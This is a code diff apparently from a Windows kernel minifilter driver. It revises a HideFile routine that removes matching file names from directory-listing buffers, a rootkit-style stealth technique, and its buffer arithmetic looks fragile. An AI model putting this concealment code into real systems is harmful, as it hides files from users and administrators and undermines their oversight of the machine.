@@ -19,7 +19,6 @@ void HideFile(
 
 	PFILE_BOTH_DIR_INFORMATION curEntry = fileInfo;
 	PFILE_BOTH_DIR_INFORMATION prevEntry = NULL;
-	PFILE_BOTH_DIR_INFORMATION tempBuf = NULL;
 	ULONG len=0;
 	ULONG BufferPosition=0;
 	ULONG prevOffset=0;
@@ -29,43 +28,36 @@ void HideFile(
 				{
 					BufferPosition += curEntry->NextEntryOffset;
 		
-					RtlInitUnicodeString(&curFileName, curEntry->FileName);
+					curFileName.Buffer = curEntry -> FileName;
+					curFileName.Length = curFileName.MaximumLength = (USHORT)curEntry->FileNameLength;
+									
 
 					if(FsRtlIsNameInExpression(&sFile, &curFileName, TRUE, 0))
 					{
 						if( curEntry->NextEntryOffset > 0)
-						{								
-							DbgPrint("Before NextEntryOffset > 0 - %ls  - \n", curEntry->FileName);
-						
+						{			
 							len=Data->Iopb->Parameters.DirectoryControl.QueryDirectory.Length - BufferPosition; 
-								
-							RtlZeroMemory(curEntry, len + curEntry->NextEntryOffset); 
-							RtlMoveMemory(curEntry, ((PUCHAR)curEntry + curEntry->NextEntryOffset), len);
-
-
-							DbgPrint("After NextEntryOffset > 0 - %ls  - \n", curEntry->FileName);
-
-						}
+							RtlMoveMemory(curEntry, 
+							(PFILE_BOTH_DIR_INFORMATION)((PUCHAR)curEntry + curEntry->NextEntryOffset), 
+							len + curEntry->NextEntryOffset);
+						}	
 						else
 							if(curEntry->NextEntryOffset ==0)
 							{
-								DbgPrint("Before NextEntryOffset ==0 - %ls  - \n", curEntry->FileName);
 								RtlZeroMemory(curEntry, len + curEntry->NextEntryOffset); 
-								prevEntry->NextEntryOffset=0; 
-								DbgPrint("After NextEntryOffset ==0 - %ls  - \n", curEntry->FileName);			
-							}
+								((PFILE_BOTH_DIR_INFORMATION)((PCHAR) curEntry - prevOffset))->NextEntryOffset=0; 
+								break;
+							}					
+						continue;
 					}
-					
+
+
 					if(curEntry->NextEntryOffset == 0)
-					{
-						break;
-					}
-					
+					{ break; }
 					prevOffset = curEntry->NextEntryOffset;
 					prevEntry = curEntry;
 					curEntry = (PFILE_BOTH_DIR_INFORMATION) ( (PUCHAR) curEntry + curEntry->NextEntryOffset );
 				}
-
 }
 
 const FLT_OPERATION_REGISTRATION Callbacks[] = 
